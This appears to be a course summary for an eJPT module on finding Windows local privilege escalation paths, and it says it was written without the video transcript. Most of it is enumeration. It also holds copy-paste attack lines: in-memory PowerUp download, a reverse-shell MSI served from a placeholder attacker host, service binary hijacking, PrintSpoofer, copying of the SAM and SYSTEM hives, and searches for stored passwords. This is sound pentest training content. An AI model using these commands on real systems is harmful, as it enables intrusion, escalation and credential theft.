# 01 - Identifying Windows Privilege Escalation Vulnerabilities

Note: No transcript was provided. The following is a conservative, experience-based summary for an eJPT module with this title. Commands and steps reflect standard Windows local privilege escalation identification workflows commonly taught in eJPT/OSCP-style training.

## What the video covers (Introduction / big picture)
- The goal: Post-exploitation on a Windows host, systematically enumerate and identify misconfigurations and conditions that can lead to local privilege escalation (to Administrator/SYSTEM).
- Big picture workflow:
  - Establish context: who you are, OS/patch level, integrity level, token privileges.
  - Run quick-win automated checks (winPEAS/Seatbelt/PowerUp/PrivescCheck).
  - Manually verify common vectors:
    - Services: unquoted service paths, weak service permissions.
    - Scheduled tasks.
    - AlwaysInstallElevated policy.
    - Token privileges like SeImpersonate/SeAssignPrimaryToken, SeBackup/SeRestore.
    - UAC settings (if you’re local admin but medium integrity).
    - Writable directories in PATH (path hijacking).
    - Credential artifacts in files/registry/cmdkey.
  - Optionally, identify kernel/patch-based privesc with exploit suggesters (wes-ng/Watson/Sherlock).

## Flow (ordered)
1. Baseline enumeration (identity, groups, OS, patch level, token privileges).
2. Quick automated enumeration (winPEAS/Seatbelt/PowerUp/PrivescCheck).
3. Services review:
   - Unquoted service paths.
   - Services running as SYSTEM with weak binary/folder/service permissions.
4. Scheduled tasks review (tasks running as SYSTEM/Administrator with writable action paths).
5. Registry checks:
   - AlwaysInstallElevated.
   - Auto-run keys with weak ACLs.
   - UAC policy.
6. Token privilege checks:
   - SeImpersonate/SeAssignPrimaryToken (Potato/PrintSpoofer).
   - SeBackup/SeRestore/SeTakeOwnership (copy sensitive files/VSC).
7. PATH hijacking checks (writable directories early in PATH).
8. Credential discovery (files, cmdkey, Unattend.xml, web.config).
9. Kernel/patch-based privesc candidates (collect systeminfo → suggesters).
10. Prioritize and verify a viable path; plan exploitation.

## Tools highlighted
- Built-in:
  - whoami (/all, /priv), systeminfo, net, sc, schtasks, reg, icacls, findstr, wmic/Get-CimInstance, cmdkey, robocopy.
- Community/Red-team enumeration:
  - winPEAS (winPEASx64.exe/winPEASany.exe)
  - Seatbelt.exe
  - PowerUp.ps1 (Invoke-AllChecks)
  - PrivescCheck.ps1
- Permissions inspection:
  - AccessChk.exe (Sysinternals) [optional but useful]
- Exploit helpers (if conditions match):
  - PrintSpoofer.exe, RoguePotato/JuicyPotato (for SeImpersonate/SeAssignPrimaryToken)
- Patch/Kernel suggesters:
  - windows-exploit-suggester-ng (wes.py)
  - Sherlock.ps1 / Watson.exe (legacy but still seen in labs)

## Typical command walkthrough (detailed, copy-paste friendly)

Baseline (cmd.exe):
```
whoami /all
whoami /priv
whoami /groups

hostname
ver
systeminfo

wmic os get Caption,Version,BuildNumber,OSArchitecture
wmic qfe get HotFixID,InstalledOn,Description

echo %PROCESSOR_ARCHITECTURE%
net user %USERNAME%
net localgroup administrators
```

Quick automated enumeration (place binaries locally or fetch over HTTP as appropriate):

winPEAS:
```
.\winPEASx64.exe > C:\Users\Public\winpeas.txt 2>&1
```

Seatbelt:
```
.\Seatbelt.exe -group=all > C:\Users\Public\seatbelt.txt 2>&1
```

PowerUp (local file):
```
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks | Tee-Object C:\Users\Public\powerup.txt"
```

PowerUp (download + run in-memory; replace KALI_IP):
```
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerUp.ps1'); Invoke-AllChecks | Tee-Object C:\Users\Public\powerup.txt"
```

PrivescCheck:
```
powershell -ep bypass -c "Import-Module .\PrivescCheck.ps1; Invoke-PrivescCheck -Report C:\Users\Public\privesc.html"
```

Services – unquoted paths (cmd.exe):
```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" > C:\Users\Public\services.txt
type C:\Users\Public\services.txt | findstr /i /v "C:\Windows\" | findstr /i /v "\""
```

Services – details and binary path (replace SERVICE_NAME found above):
```
sc qc SERVICE_NAME
sc query SERVICE_NAME
```

Check write permissions on service binary directory and file (update path from sc qc output):
```
icacls "C:\Path\To\Service\Directory"
icacls "C:\Path\To\Service\Binary.exe"
```

Services – check if you can stop/start (might require rights; if denied, note for later/reboot window):
```
sc stop SERVICE_NAME
sc start SERVICE_NAME
```

Scheduled tasks (scan for tasks running as SYSTEM/Admin and writable action paths):
```
schtasks /query /fo LIST /v > C:\Users\Public\tasks.txt
```

AlwaysInstallElevated:
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
```

UAC policy (useful if you’re already in Administrators but medium integrity):
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

PATH hijacking (PowerShell – see if Users/Everyone have Write/Modify on any PATH directories):
```
powershell -NoP -C "$env:Path.Split(';') | ?{$_ -and (Test-Path $_)} | %{'`n== '+$_+' =='; (Get-Acl $_).Access | ?{$_.IdentityReference -match 'Users|Everyone|Authenticated Users' -and $_.FileSystemRights -match 'Write|Modify|FullControl'} }"
```

Token privileges (cmd.exe; look for SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege enabled):
```
whoami /priv
```

If SeBackupPrivilege/SeRestorePrivilege are enabled, try backup semantics (may need a temp dir you can write to):
```
mkdir C:\Temp 2>nul
robocopy C:\Windows\System32\config C:\Temp SAM SYSTEM SECURITY /b
```

Credential discovery:
```
cmdkey /list

findstr /si /m /p "password" "C:\Users\*\Desktop\*.txt" "C:\Users\*\Documents\*.txt" "C:\ProgramData\*.config" "C:\inetpub\wwwroot\*.config" 2>nul
dir /s /b "C:\Windows\Panther\Unattend.xml" "C:\Windows\Panther\Unattend\Unattend.xml" 2>nul
type "C:\Windows\Panther\Unattend.xml" 2>nul
type "C:\Windows\Panther\Unattend\Unattend.xml" 2>nul
```

Kernel/patch-based privesc preparation:
```
systeminfo > C:\Users\Public\sysinfo.txt
wmic qfe get HotFixID,InstalledOn > C:\Users\Public\hotfix.txt
```
On your attack box (wes-ng):
```
wes.py --update
wes.py sysinfo.txt --exploits-only
```

Common exploitation sequences (only if the checks above confirm the condition):

- AlwaysInstallElevated MSI (Kali to generate; Windows to run):
  - Kali:
    ```
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f msi -o evil.msi
    python3 -m http.server 8000
    ```
  - Windows (download and install as SYSTEM):
    ```
    powershell -c "(New-Object Net.WebClient).DownloadFile('http://KALI_IP:8000/evil.msi','C:\Users\Public\evil.msi')"
    msiexec /qn /i C:\Users\Public\evil.msi
    ```

- Weak service permissions (change config to your payload if SERVICE_CHANGE_CONFIG is allowed):
```
sc qc VULNSVC
sc config VULNSVC binPath= "C:\Users\Public\payload.exe"
sc stop VULNSVC
sc start VULNSVC
```

- SeImpersonatePrivilege (PrintSpoofer):
```
.\PrintSpoofer.exe -i -c cmd
```

## Practical tips
- Verify before exploiting: many vectors require both a vulnerable condition and a feasible restart/start capability (services/tasks).
- Prefer built-in enumeration first to reduce noise; use automation to catch misses (winPEAS/PowerUp).
- For services:
  - Unquoted path alone isn’t enough; you need write access to one of the candidate path locations and a restart trigger.
  - Weak service permissions (SERVICE_CHANGE_CONFIG/WRITE_DAC/WRITE_OWNER) are higher-signal.
- If SeImpersonate is enabled in medium integrity, Potato/PrintSpoofer is often the fastest route to SYSTEM in labs.
- AlwaysInstallElevated: both HKLM and HKCU must be 1 for reliable MSI escalation.
- UAC bypasses are relevant if you are in Administrators but not high integrity; not a true escalation from standard user.
- Log outputs to files (Public folder) so you can triage later and exfiltrate minimal data (defensible and efficient).
- If domain-joined, expand checks to SYSVOL GPP cpassword, LAPS misconfig, delegated rights, but keep scope on “local” for eJPT unless instructed otherwise.

## Minimal cheat sheet (one-screen flow)
```
:: Identity, OS, patches, privileges
whoami /all & whoami /priv & systeminfo
wmic qfe get HotFixID,InstalledOn

:: Quick-win scanners (adjust paths)
.\winPEASx64.exe > C:\Users\Public\winpeas.txt
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks | Tee-Object C:\Users\Public\powerup.txt"

:: Services (unquoted/weak perms)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" > C:\Users\Public\services.txt
sc qc SERVICE_NAME
icacls "C:\Path\To\Service\Dir" & icacls "C:\Path\To\Binary.exe"

:: Scheduled tasks
schtasks /query /fo LIST /v > C:\Users\Public\tasks.txt

:: AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: PATH hijacking (PowerShell)
powershell -NoP -C "$env:Path.Split(';') | ?{$_ -and (Test-Path $_)} | %{'== '+$_+' =='; (Get-Acl $_).Access | ?{$_.IdentityReference -match 'Users|Everyone|Authenticated Users' -and $_.FileSystemRights -match 'Write|Modify|FullControl'}}"

:: Token privileges
whoami /priv

:: Credentials
cmdkey /list
findstr /si /m /p "password" "C:\Users\*\Desktop\*.txt" "C:\ProgramData\*.config" 2>nul

:: Kernel suggesters (prepare)
systeminfo > C:\Users\Public\sysinfo.txt
```

## Summary
- This module focuses on identifying Windows local privilege escalation opportunities through disciplined enumeration and verification.
- Start with identity and OS context, then run automated checks and manually validate common vectors: services (unquoted/weak ACLs), scheduled tasks, AlwaysInstallElevated, token privileges (SeImpersonate/SeBackup), PATH hijacking, credentials at rest, and patch-based opportunities.
- The provided commands give you a copy-paste-ready playbook for eJPT labs to quickly spot and confirm viable escalation paths.